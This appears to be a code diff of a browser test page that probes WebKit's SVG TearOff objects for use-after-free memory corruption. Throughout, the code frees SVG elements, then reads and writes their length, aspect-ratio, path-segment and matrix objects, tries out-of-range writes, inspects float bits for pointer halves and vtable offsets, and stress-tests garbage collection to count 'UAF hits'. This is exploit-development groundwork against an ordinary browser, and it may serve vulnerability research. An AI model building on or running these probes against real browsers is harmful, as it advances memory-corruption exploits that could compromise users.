-    (different?' ← DIFFERENT FIELDS = two distinct write sites':'← same field (expected without active anim)'),
-    (different?'crit':'info'));
-
-  // Write to baseVal, then read animVal — do they cross-talk?
-  if(bvAfter!==null){
-    bvX.value=999;
-    var avRb=null;
-    try{avRb=avX.value;}catch(e){}
-    log('ANM[1]: write(bv=999) → animVal reads='+avRb,
-      (avRb===999?'info — same field':avRb!==null?'crit — DIFFERENT FIELD, avRb='+avRb:'fail')
-      ,(avRb!==999&&avRb!==null?'crit':'info'));
-  }
-  svg1.remove();
-
-  // ANM-2: SVGAnimatedLength.animVal field offset exploration
-  // When NO animation is active: animVal mirrors baseVal (same field)
-  // When animation IS active: animVal reads from m_animatedValue (a separate SVGLength)
-  // So: set up animation, don't start it yet, free element, check if animVal reads different
-  log('ANM[2]: paused animation — does animVal isolate from baseVal?','info');
-  var svg2=makeSVG();
-  var r2=document.createElementNS(NS,'rect');
-  r2.setAttribute('x','11');r2.setAttribute('y','22');
-  r2.setAttribute('width','100');r2.setAttribute('height','100');
-  // Add animation but DON'T start it (begin='indefinite')
-  var anim2=document.createElementNS(NS,'animate');
-  anim2.setAttribute('attributeName','x');
-  anim2.setAttribute('from','11');anim2.setAttribute('to','999');
-  anim2.setAttribute('dur','10s');anim2.setAttribute('begin','indefinite');
-  r2.appendChild(anim2);
-  svg2.appendChild(r2);
-
-  var bv2=r2.x.baseVal;
-  var av2=r2.x.animVal;
-  r2.x;  // force TearOff creation
-  log('ANM[2]: before anim start: bv='+bv2.value+' av='+av2.value,'info');
-  // Start animation (begin)
-  anim2.beginElement();
-  log('ANM[2]: anim started, av='+av2.value,'info');
-  // Free immediately after start
-  svg2.removeChild(r2);
-  var bv2a=null,av2a=null;
-  try{bv2a=bv2.value;log('ANM[2]: bv after free='+bv2a,'star');}catch(e){}
-  try{av2a=av2.value;log('ANM[2]: av after free='+av2a,'star');}catch(e){}
-  log('ANM[2]: separate fields='+(bv2a!==av2a),(bv2a!==av2a?'crit':'info'));
-  svg2.remove();
-}
-
-// ─── ASP: SVGPreserveAspectRatio TEAROFF ────────────────────────────────────
-// SVGImageElement.preserveAspectRatio.baseVal returns SVGPreserveAspectRatio TearOff
-// Fields: .align (uint16, 1-10) and .meetOrSlice (uint16, 1-2)
-// This TearOff reads DIFFERENT struct offsets than SVGLength
-// And reads UINT16 values, not float — might expose ptr halves
-
-function runASP(){
-  log('══ ASP: SVGPreserveAspectRatio TEAROFF ══════════','info');
-
-  // ASP-1: Basic TearOff UAF test
-  log('ASP[1]: SVGPreserveAspectRatio TearOff UAF','info');
-  var svg1=makeSVG();
-  var img=document.createElementNS(NS,'image');
-  img.setAttribute('x','0');img.setAttribute('y','0');
-  img.setAttribute('width','100');img.setAttribute('height','100');
-  img.setAttribute('href','data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==');
-  svg1.appendChild(img);
-
-  var par=img.preserveAspectRatio;
-  var parBase=par.baseVal;
-  log('ASP[1]: baseline align='+parBase.align+' meetOrSlice='+parBase.meetOrSlice,'info');
-
-  svg1.removeChild(img); // FREE
-
-  var alignAfter=null,mosAfter=null;
-  try{alignAfter=parBase.align;log('ASP[1]: align after free='+alignAfter,(alignAfter!==null?'star':'warn'));}
-  catch(e){log('ASP[1]: align err: '+e.message,'fail');}
-  try{mosAfter=parBase.meetOrSlice;log('ASP[1]: meetOrSlice after free='+mosAfter,(mosAfter!==null?'star':'warn'));}
-  catch(e){log('ASP[1]: meetOrSlice err: '+e.message,'fail');}
-
-  // ASP-2: UAF write — can we set align/meetOrSlice to arbitrary values?
-  if(alignAfter!==null){
-    log('ASP[2]: UAF write to align/meetOrSlice','info');
-    try{
-      parBase.align=9;
-      log('ASP[2]: write align=9 readback='+parBase.align,(parBase.align===9?'pass':'warn'));
-    }catch(e){log('ASP[2]: align write err: '+e.message,'fail');}
-    try{
-      parBase.meetOrSlice=2;
-      log('ASP[2]: write meetOrSlice=2 readback='+parBase.meetOrSlice,(parBase.meetOrSlice===2?'pass':'warn'));
-    }catch(e){log('ASP[2]: meetOrSlice write err: '+e.message,'fail');}
-
-    // Can we write OUT OF RANGE values?
-    // Valid align: 1-9 (SVG_PRESERVEASPECTRATIO_XMINYMIN=1 ... SVG_PRESERVEASPECTRATIO_XMAXYMAX=9)
-    // Valid meetOrSlice: 1-2
-    // If WebKit doesn't bounds-check: out-of-range uint16 values can be written
-    log('ASP[2]: OOB write — align=255, meetOrSlice=255','info');
-    try{
-      parBase.align=255;
-      log('ASP[2]: OOB align=255 readback='+parBase.align,(parBase.align===255?'crit':'info'));
-    }catch(e){log('ASP[2]: OOB align err: '+e.message,'warn');}
-    try{
-      parBase.meetOrSlice=255;
-      log('ASP[2]: OOB mos=255 readback='+parBase.meetOrSlice,(parBase.meetOrSlice===255?'crit':'info'));
-    }catch(e){log('ASP[2]: OOB mos err: '+e.message,'warn');}
-    // Negative/large values
-    try{
-      parBase.align=0xFFFF;
-      log('ASP[2]: align=0xFFFF readback='+parBase.align,'star');
-    }catch(e){log('ASP[2]: align=0xFFFF err: '+e.message,'info');}
-    try{
-      parBase.align=0x1234;
-      log('ASP[2]: align=0x1234 readback='+parBase.align,'star');
-    }catch(e){log('ASP[2]: align=0x1234 err: '+e.message,'info');}
-  }
-  svg1.remove();
-
-  // ASP-3: SVGSVGElement.preserveAspectRatio — on root svg element
-  log('ASP[3]: SVGSVGElement.preserveAspectRatio TearOff','info');
-  var svg3=document.createElementNS(NS,'svg');
-  var parentSVG=makeSVG();
-  parentSVG.appendChild(svg3);
-  var par3=svg3.preserveAspectRatio;
-  var base3=par3.baseVal;
-  log('ASP[3]: baseline align='+base3.align+' mos='+base3.meetOrSlice,'info');
-  parentSVG.removeChild(svg3); // FREE
-  var a3=null,m3=null;
-  try{a3=base3.align;log('ASP[3]: align after free='+a3,'star');}catch(e){log('ASP[3]: align err: '+e.message,'fail');}
-  try{m3=base3.meetOrSlice;log('ASP[3]: mos after free='+m3,'star');}catch(e){log('ASP[3]: mos err: '+e.message,'fail');}
-  parentSVG.remove();
-}
-
-// ─── PTH: SVGPathElement TEAROFF ────────────────────────────────────────────
-// SVGPathElement.pathLength.baseVal — returns SVGAnimatedLength (same as rect)
-// BUT: does SVGPathElement's SVGAnimatedLength m_pathLength happen to be at
-// a DIFFERENT struct offset than SVGRectElement's m_x?
-// Goal: probe if SVGPathElement gives a different write offset (closer to vtable)
-//
-// Also: SVGPathElement.pathSegList — returns SVGPathSegList TearOff
-// pathSegList.getItem(0) → SVGPathSeg TearOff with float fields (x,y coordinates)
-// This might read float64 or float32 at yet another struct offset
-
-function runPTH(){
-  log('══ PTH: SVGPathElement TEAROFF PROBE ════════════','info');
-
-  // PTH-1: SVGPathElement.pathLength UAF
-  log('PTH[1]: pathLength TearOff on freed SVGPathElement','info');
-  var svg1=makeSVG();
-  var path=document.createElementNS(NS,'path');
-  path.setAttribute('d','M 10 20 L 30 40');
-  path.setAttribute('pathLength','100');
-  svg1.appendChild(path);
-  var pl=path.pathLength;
-  var plBase=pl.baseVal;
-  log('PTH[1]: pathLength.baseVal='+plBase.value,'info');
-  svg1.removeChild(path); // FREE
-  var plAfter=null;
-  try{plAfter=plBase.value;log('PTH[1]: pathLength after free='+plAfter,(plAfter!==null?'star':'warn'));}
-  catch(e){log('PTH[1]: pathLength err: '+e.message,'fail');}
-  // UAF write
-  if(plAfter!==null){
-    try{
-      plBase.value=9999;
-      log('PTH[1]: UAF write(9999) readback='+plBase.value,'crit');
-      _f32v[0]=plBase.value;
-      log('PTH[1]: write bits=0x'+_u32v[0].toString(16),'star');
-    }catch(e){log('PTH[1]: write err: '+e.message,'fail');}
-  }
-  svg1.remove();
-
-  // PTH-2: SVGPathSeg — path segment TearOff
-  // path.pathSegList.getItem(0) returns SVGPathSegMovetoAbs with .x and .y (float32)
-  // If this gives a UAF, it reads a DIFFERENT struct (SVGPathSegData or similar)
-  log('PTH[2]: SVGPathSeg TearOff UAF probe','info');
-  var svg2=makeSVG();
-  var path2=document.createElementNS(NS,'path');
-  path2.setAttribute('d','M 10 20 L 30 40 Z');
-  svg2.appendChild(path2);
-
-  // Note: pathSegList is deprecated but may still work in WebKit
-  var psl=path2.pathSegList||path2.animatedPathSegList;
-  if(psl&&psl.numberOfItems>0){
-    var seg0=psl.getItem(0);
-    log('PTH[2]: seg[0] type='+seg0.pathSegTypeAsLetter+' x='+seg0.x+' y='+seg0.y,'info');
-    svg2.removeChild(path2); // FREE
-    var sx=null,sy=null;
-    try{sx=seg0.x;log('PTH[2]: seg.x after free='+sx,(sx!==null?'star':'warn'));}
-    catch(e){log('PTH[2]: seg.x err: '+e.message,'fail');}
-    try{sy=seg0.y;log('PTH[2]: seg.y after free='+sy,(sy!==null?'star':'warn'));}
-    catch(e){log('PTH[2]: seg.y err: '+e.message,'fail');}
-    if(sx!==null){
-      try{
-        seg0.x=8888;
-        log('PTH[2]: UAF write seg.x=8888 readback='+seg0.x,'crit');
-      }catch(e){log('PTH[2]: seg.x write err: '+e.message,'fail');}
-    }
-  }else{
-    log('PTH[2]: pathSegList unavailable (deprecated), trying getPathData','warn');
-    // Fallback: getTotalLength gives a float64 result about the path
-    var tl=path2.getTotalLength?path2.getTotalLength():null;
-    log('PTH[2]: getTotalLength='+tl,'info');
-    svg2.removeChild(path2);
-  }
-  svg2.remove();
-
-  // PTH-3: SVGTextElement coordinate TearOff — reads getStartPositionOfChar
-  // SVGTextContentElement.getStartPositionOfChar(0) returns DOMPoint (float64 x,y)
-  // This is a COMPUTED value, not a TearOff. But let's check if it reads freed state.
-  log('PTH[3]: SVGTextElement getStartPositionOfChar after free','info');
-  var svg3=makeSVG();
-  svg3.setAttribute('width','200');svg3.setAttribute('height','200');
-  svg3.style.cssText='position:absolute;left:-9999px;top:-9999px';
-  var text=document.createElementNS(NS,'text');
-  text.setAttribute('x','10');text.setAttribute('y','20');
-  text.textContent='ABC';
-  svg3.appendChild(text);
-  document.body.appendChild(svg3);
-  var startPos=null;
-  try{startPos=text.getStartPositionOfChar(0);}catch(e){}
-  if(startPos){log('PTH[3]: getStartPositionOfChar(0) x='+startPos.x+' y='+startPos.y,'info');}
-  // Grab x TearOff before free
-  var textXBase=text.x.baseVal;
-  svg3.removeChild(text);
-  var txAfter=null;
-  try{txAfter=textXBase.value;log('PTH[3]: text.x after free='+txAfter,'star');}
-  catch(e){log('PTH[3]: text.x err: '+e.message,'fail');}
-  if(txAfter!==null){
-    try{
-      textXBase.value=12345;
-      log('PTH[3]: text.x UAF write=12345 readback='+textXBase.value,'crit');
-    }catch(e){log('PTH[3]: text.x write err: '+e.message,'fail');}
-  }
-  svg3.remove();
-
-  // PTH-4: SVGSVGElement coordinate TearOff — nested SVG (x,y are lengths)
-  // SVGSVGElement.x.baseVal — is THIS at a different struct offset?
-  log('PTH[4]: nested SVGSVGElement coordinate TearOff','info');
-  var svg4=makeSVG();
-  var innerSVG=document.createElementNS(NS,'svg');
-  innerSVG.setAttribute('x','55');innerSVG.setAttribute('y','66');
-  innerSVG.setAttribute('width','77');innerSVG.setAttribute('height','88');
-  svg4.appendChild(innerSVG);
-  var isvgX=innerSVG.x.baseVal;
-  var isvgY=innerSVG.y.baseVal;
-  svg4.removeChild(innerSVG); // FREE
-  var ix=null,iy=null;
-  try{ix=isvgX.value;log('PTH[4]: inner svg.x after free='+ix,(ix===55?'star':'warn'));}
-  catch(e){log('PTH[4]: svg.x err: '+e.message,'fail');}
-  try{iy=isvgY.value;log('PTH[4]: inner svg.y after free='+iy,(iy===66?'star':'warn'));}
-  catch(e){log('PTH[4]: svg.y err: '+e.message,'fail');}
-  // UAF write to inner svg
-  if(ix!==null){
-    try{isvgX.value=9876;log('PTH[4]: inner svg UAF write ok, x='+isvgX.value,'crit');}
-    catch(e){log('PTH[4]: inner svg write err: '+e.message,'fail');}
-  }
-  svg4.remove();
-
-  // PTH-5: SVGMatrix UAF FIELD COMPARISON
-  // If MTX confirmed float64, compare the float64 matrix.a vs SVGLength float32 x
-  // by writing BOTH on the same freed element and reading back
-  // This lets us confirm they read DIFFERENT offsets in the same freed struct
-  log('PTH[5]: SVGMatrix vs SVGLength — compare offsets on same freed element','info');
-  var svg5=makeSVG();
-  var r5=document.createElementNS(NS,'rect');
-  r5.setAttribute('x','10');r5.setAttribute('y','20');
-  r5.setAttribute('width','30');r5.setAttribute('height','40');
-  r5.setAttribute('transform','matrix(1 0 0 1 50 60)');
-  svg5.appendChild(r5);
-  // Grab ALL TearOffs before free
-  var tfX=r5.x.baseVal;
-  var tfY=r5.y.baseVal;
   var mxTF=null;
-  try{mxTF=r5.transform.baseVal.getItem(0).matrix;}catch(e){}
-  svg5.removeChild(r5); // FREE both SVGLength AND SVGMatrix TearOffs simultaneously
-  // Read both
-  var xAfter=null,mxA=null,mxE=null;
-  try{xAfter=tfX.value;log('PTH[5]: x.baseVal after free='+xAfter,'star');}catch(e){}
-  try{mxA=mxTF&&mxTF.a;log('PTH[5]: matrix.a after free='+mxA,(mxA!==null?'star':'warn'));}catch(e){log('PTH[5]: matrix.a err: '+(e&&e.message),'fail');}
-  try{mxE=mxTF&&mxTF.e;log('PTH[5]: matrix.e after free='+mxE,(mxE!==null?'star':'warn'));}catch(e){}
-  // Write to both — if they're at different offsets, one write shouldn't corrupt the other
-  if(xAfter!==null&&mxTF){
-    try{tfX.value=111;mxTF.a=2.222;
-      log('PTH[5]: write x=111 and matrix.a=2.222','info');
-      log('PTH[5]: readback x='+tfX.value+' matrix.a='+mxTF.a,
-        (tfX.value===111&&Math.abs(mxTF.a-2.222)<1e-10?'crit':'star'));
-      log('PTH[5]: independent offsets='+(tfX.value===111&&Math.abs(mxTF.a-2.222)<1e-10),
-        (tfX.value===111&&Math.abs(mxTF.a-2.222)<1e-10?'crit':'warn'));
-    }catch(e){log('PTH[5]: write err: '+e.message,'fail');}
-  }
-  svg5.remove();
+  var lengthTF=null;
+
+  (function(){
+    var rect=document.createElementNS(NS,'rect');
+    rect.setAttribute('x','10');rect.setAttribute('y','20');
+    rect.setAttribute('width','30');rect.setAttribute('height','40');
+    rect.setAttribute('transform','matrix(1 0 0 1 100 200)');
+    svg.appendChild(rect);
+    // Grab BOTH types of TF
+    lengthTF=rect.x.baseVal;
+    try{mxTF=rect.transform.baseVal.getItem(0).matrix;}catch(e){}
+    reg.register(rect,'rect-mx-test');
+    svg.removeChild(rect);
+    // rect drops here
+  })();
+
+  log('MTX: rect dropped, GC pressure...','info');
+  gcPressure(1000000);
+
+  setTimeout(function(){
+    log('MTX: firedRectGC='+firedRectGC,
+      (firedRectGC?'crit — rect JS wrapper GC\'d!':'warn — rect still alive (TF holds strong ref)'));
+
+    // Now try both TFs
+    var xVal=null,mxE=null;
+    try{xVal=lengthTF.value;log('MTX: lengthTF.value after GC='+xVal,
+      (xVal===10?'warn — alive':'crit — changed: '+xVal));}
+    catch(e){log('MTX: lengthTF err: '+e.message,'crit');}
+
+    try{mxE=mxTF&&mxTF.e;log('MTX: matrix.e after GC='+mxE,
+      (mxE===100?'warn — alive':'crit — changed: '+mxE));}
+    catch(e){log('MTX: matrix.e err: '+(e&&e.message),'crit');}
+
+    // Try writing to both after potential GC
+    try{
+      lengthTF.value=9999;
+      mxTF&&(mxTF.e=8888);
+      log('MTX: write after GC: lengthTF='+lengthTF.value+' matrix.e='+(mxTF&&mxTF.e),'star');
+    }catch(e){log('MTX: write err: '+(e&&e.message),'crit');}
+
+    // MTX-2: Stress test — allocate many rects, grab TFs, drop all, GC pressure
+    // If GC runs, do any TF reads return garbage?
+    log('MTX[2]: mass stress — 50 rects, TFs grabbed, all dropped, GC pressure','info');
+    var tfs50=[];
+    var canaries=[];
+    for(var i=0;i<50;i++){
+      (function(idx){
+        var r=document.createElementNS(NS,'rect');
+        r.setAttribute('x',String(idx*10));svg.appendChild(r);
+        var tf=r.x.baseVal;
+        tfs50.push({tf:tf,expected:idx*10,idx:idx});
+        canaries.push(idx*10);
+        svg.removeChild(r);
+      })(i);
+    }
+    gcPressure(2000000);
+    setTimeout(function(){
+      var uafHits=0,aliveCount=0,zeroed=0,exceptions=0;
+      for(var j=0;j<tfs50.length;j++){
+        var t=tfs50[j];
+        try{
+          var v=t.tf.value;
+          if(v===t.expected)aliveCount++;
+          else if(v===0)zeroed++;
+          else{uafHits++;log('MTX[2]: UAF HIT at idx='+t.idx+' expected='+t.expected+' got='+v,'crit');}
+        }catch(e){exceptions++;log('MTX[2]: exception at idx='+t.idx+': '+e.message,'star');}
+      }
+      log('MTX[2]: alive='+aliveCount+'/50 zeroed='+zeroed+' uafHits='+uafHits+' exceptions='+exceptions,
+        (uafHits>0?'crit — REAL UAF!':exceptions>0?'star — exceptions = freed elements!':'warn — all alive (strong refs)'));
+
+      svg.remove();
+    },500);
+  },500);
 }
 </script>
 </body>
